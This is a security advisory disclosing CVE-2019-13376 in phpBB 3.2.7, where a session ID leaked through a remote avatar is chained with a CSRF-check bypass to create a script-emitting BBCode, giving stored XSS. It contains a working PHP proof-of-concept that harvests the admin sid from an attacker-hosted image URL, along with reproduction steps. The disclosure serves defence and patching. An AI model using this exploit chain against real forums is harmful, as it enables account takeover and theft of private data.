# SSD Advisory - phpBB CSRF Token Hijacking leading to Stored XSS

**Vulnerability Summary**  
When an admin accesses the Administrator Control Panel (ACP) in phpBB, a leftover session id GET parameter is present in the URL when he goes back to the Board index. Using a special remote avatar URL, an attacker can leak this session id value and perform a CSRF attack in order to create an XSS BBCode, allowing stored xss on the server.

**CVE**  
CVE-2019-13376

**Credit**  
An independent Security Researcher has reported this vulnerability to SSD Secure Disclosure Program.

**Affected Systems**  
phpBB version 3.2.7

**Vendor Response**  
The vulnerability was fixed in version 3.2.8

**Vulnerability Details**

**0x01 - Leaking the administrator's session ID**

PhpBB3 is divided into two parts: a front and back end. The front end is used to create posts, manage profiles, send private messages etc. The back end, or Administration Control Panel, is used to manage the board itself and change crucial settings such as the upload path for uploaded attachments etc. It can also be used to perform sensitive actions such as database backups. The admin panel can only be accessed by administrators of a board.

When a user is also an administrator, he usually logs into the front end context. If the wants to access the back end, he has to log into it again by entering his credentials. This means phpBB3 separates the front end session and back end session, but they are not exclusive to each other.

What is interesting about the Admin Panel is that the session ID of the administrative user is reflected as a GET parameter. This means if it is possible to embed an external image with an attacker controlled domain, it would be possible to leak the admin session ID of the administrator via the HTTP referrer. The session ID is shown in the next image as the _sid_ parameter.

![](https://ssd-disclosure.com/wp-content/uploads/2019/07/phpBB_acpsessid.png)  
Interestingly enough, when an administrator is finished with using the back end and leaves it via clicking the ‘Board Index’ link, he is redirected to the index page of the forum and the SID parameter is still attached as a GET parameter. This is shown in the following image:

![](https://ssd-disclosure.com/wp-content/uploads/2019/07/phpBB_frontendsess.png)  
As can be seen, the SID parameter is still set as a GET parameter and has the same value. I then looked at the index page of the front end and tried to come up with a way to embed a user controlled, external image into it so the SID parameter is leaked via the HTTP Referer.

As it turns out, achieving this task was easier than expected. If a targeted phpBB3 board has remote avatars enabled, a common setting that allows users to embed avatars from a remote URL instead of uploading them.

The next screenshot shows how an external image is embedded as an avatar from the URL attacker.com:

![](https://ssd-disclosure.com/wp-content/uploads/2019/07/phpBB_externalavatar.png)  
It is possible to then have this external image embedded into the index page of the front end system via the notification system. Whenever a user receives a notification, a short summary of the notification is displayed to him (on every page), along with the user avatar of the user who caused  
the notification. An example screenshot of this is shown below:

![](https://ssd-disclosure.com/wp-content/uploads/2019/07/phpBB_notification.png)  
As can be seen, the remote avatar is embedded into this page (the user does not have to click the notification bell, the image is always embedded).

This means as soon as an administrator leaves the ACP and his session ID is stored as a GET parameter and a notification for this user exists, his session ID can be leaked via the HTTP referer.

Notifications are generated when:

*   a user receives a PM
*   a user quotes him in a post
*   another user replies to the user's thread
*   a new post has been made to a subscribed thread

**0x02 – escalating the session ID leakage to Stored XSS**

Being in possession of the session ID of the administrator is in and of it self not enough to log into his account. PhpBB3 sessions are bound to an IP.

The following is extracted from the phpBB3 Admin Dashboard, which explains the “IP Validation” setting:

_“Determines how much of the users IP is used to validate a session; All compares the complete address, A.B.C the first x.x.x, A.B the first x.x, None disables checking. On IPv6 addresses A.B.C compares the first 4 blocks and A.B the first 3 blocks.”_

This setting is per default set to A.B.C, so theoretically an attacker with enough resources and motivation could try to get an IP from the target’s carrier. However, there is a much simpler approach.

There exists a feature in the ACP that is vulnerable to CSRF attacks. This feature is the “custom Bbcode” feature. Like many other forums, phpBB3 allows forum users to use shortcodes such as `[img]http://abc.com/image.jpg[/img]` in posts, private messages and threads that then turn into HTML code displayed to other users. PhpBB3 ships with a couple of default ones, like `[img]`, `[url]`, `[I]` etc. As the name of the custom Bbcode ACP feature suggests, it allows to create new bbcodes. The next screenshot shows an example of how such a new custom bbCode can lead to XSS:

![](https://ssd-disclosure.com/wp-content/uploads/2019/07/phpBB_custombbcode.png)  
Now, back to the CSRF vulnerability. PhpBB3 has two mechanisms in the ACP to prevent CSRF attacks:

1.  The SID of the admin MUST be sent via GET or Post
2.  A CSRF nonce is generated for each form

When looking at the source code behind this bbCode form, one interesting thing can be noticed:

``` php
// Set up general vars
$action    = $request->variable('action', '');
$bbcode_id = $request->variable('bbcode', 0);
$submit = $request->is_set_post('submit');
$this->tpl_name = 'acp_bbcodes';
$this->page_title = 'ACP_BBCODES';
$form_key = 'acp_bbcodes';
add_form_key($form_key);
if ($submit && !check_form_key($form_key))
{
    trigger_error($user->lang['FORM_INVALID'] . adm_back_link($this->u_action),
    E_USER_WARNING);
}
```

(The code can be found in `/includes/acp/acp_bbcodes.php` in the method main)

This interesting thing is that the CSRF nonce is only checked when the POST parameter submit is set. If it is not, the nonce is not checked but execution continues normally. This means the second CSRF check for this form can be bypassed by simply not sending the submit POST parameter.

Since we are in possession of the first protection, the SID of the admin it is now possible to CSRF this form. Luckily, the variable() method of the request object returns either GET or POST variables, meaning it is possible to perform the entire CSRF via GET parameters.

As a result, the CSRF can be chained with the first vulnerability. By embedding an image with an external URL into the index page of the front end that points to an attacker server that waits for the SID parameter being leaked in the HTTP Referer and then redirects the request to the image in a way that it exploits the CSRF vulnerability in the ACP.

PoC code for this:

``` php
<?php
$target_url = "http://localhost/phpBB3-3.2.7/";
// put the desired shortcode here. {TEXT} is dynamic and allows for example
// [xss]customCode();[/xss] to turn into <script>customCode()</script>.
$custom_shortcode = "[xss]{TEXT}[/xss]";
// the HTML replacement. You can also hardcore the code between the script tags.
$shortcode_replacement = "<script>{TEXT}</script>";
// If a session ID is available, attempt the CSRF exploit
if(strpos($_SERVER['HTTP_REFERER'], 'sid') !== false) {
    // leak the session ID of the nonce $parts = parse_url($_SERVER['HTTP_REFERER']);
    parse_str($parts['query'], $query);
    if(!isset($query['sid'])) {
        header('Content-Type: image/png');
        $img = imagecreatefrompng('avatar.png');
        imagepng($img);
        die;
    }
    // build the CSRF payload
    $payload = http_build_query(
        array(
            'bbcode_match' => $custom_shortcode,
            'bbcode_tpl' => $shortcode_replacement,
            'i' => 'acp_bbcodes',
            'mode' => 'bbcodes',
            'action' => 'create',
            'sid' => $query['sid']
        )
    );
    // adm is the default admin URL
    $exploit_url = $target_url . "/adm/?" . $payload;
    header('Location: ' . $exploit_url);
} else {
    header('Content-Type: image/png');
    $img = imagecreatefrompng('avatar.png');
    imagepng($img);
    die;
}
```

This code would create a XSS shortcode in the back end.

**Steps to Recreate**

1.  install the latest phpBB3 version and create an administrator account
2.  in the ACP, go to General ? Avatar settings and enable remote avatars
3.  upload the poc.php file, along with an avatar.png to a webserver
4.  edit the poc.php file so that the target URL etc are adjusted to your installation
5.  create a new forum user in another tab and authenticate as him
6.  set this users remote avatar by navigating to: /ucp.php ? Profile ? Edit avatar
7.  Set the remote avatar URL so that the URL ends with either .jpg or png. Example:  
    http://attacker.com/poc.php?image.png. Alternatively, you can just use .htaccess directives  
    tohide the .php part of the URL.
8.  As the forum user, send the admin a PM (content does not matter)
9.  switch back to the admin user
10.  Go to the back end
11.  Click on Board index

You should then be able to see that a XSS shortcode has been created. This shortcode can now be abused by attackers to execute arbitrary XSS code in Private Messages, threads and posts to take over user accounts, read private messages of other users and posts that are not visible to the user. Furthermore, the attacker can XSS the admin to create and download for example database backups.

**Additional Notes**

Whenever a user logs into the front end of phpBB3, the front page is loaded with the SID parameter set as the GET parameter as well. This means it is possible to steal the SID of any user when they log in. However, the IP address validation makes this difficult to exploit.

It is also possible to exploit this vulnerability via CSRF entirely. When you load the forum (they are not protected by default via X-Frame-Options) in an iFrame and try to load the admin panel (per default the URL is /adm without supplying a valid SID as a GET parameter, the admin is redirected to the front page of the forum, with the admin SID set as a GET parameter.